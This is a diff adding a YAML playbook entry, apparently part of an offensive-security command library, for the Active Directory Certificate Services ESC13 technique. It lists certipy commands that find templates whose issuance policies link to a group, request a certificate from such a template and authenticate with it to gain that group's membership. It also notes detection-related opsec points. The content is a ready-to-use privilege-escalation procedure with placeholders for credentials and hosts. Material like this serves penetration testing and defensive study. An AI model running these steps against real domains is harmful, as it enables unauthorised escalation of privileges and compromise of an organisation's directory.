@@ -1,0 +1,24 @@
+name: ADCSESC13
+description: ESC13 - Issuance Policy OID group link abuse
+commands:
+- '# ESC13 exploits OID group links in certificate templates'
+- '# If template has issuance policy linked to a group, the certificate'
+- '# grants membership to that group'
+- ''
+- '# Step 1: Find templates with issuance policies'
+- certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable
+- ''
+- '# Step 2: Check for OID group links'
+- '# Look for msPKI-Certificate-Policy pointing to OID objects'
+- '# OID objects may have msDS-OIDToGroupLink attribute'
+- ''
+- '# Step 3: Request certificate with linked policy'
+- certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>'
+- ''
+- '# Step 4: Authenticate - certificate grants group membership'
+- certipy auth -pfx <USER>.pfx -dc-ip <DC_IP>
+opsec:
+- OID group links are uncommon in production
+- Certificate-based group membership is logged
+references:
+- https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53
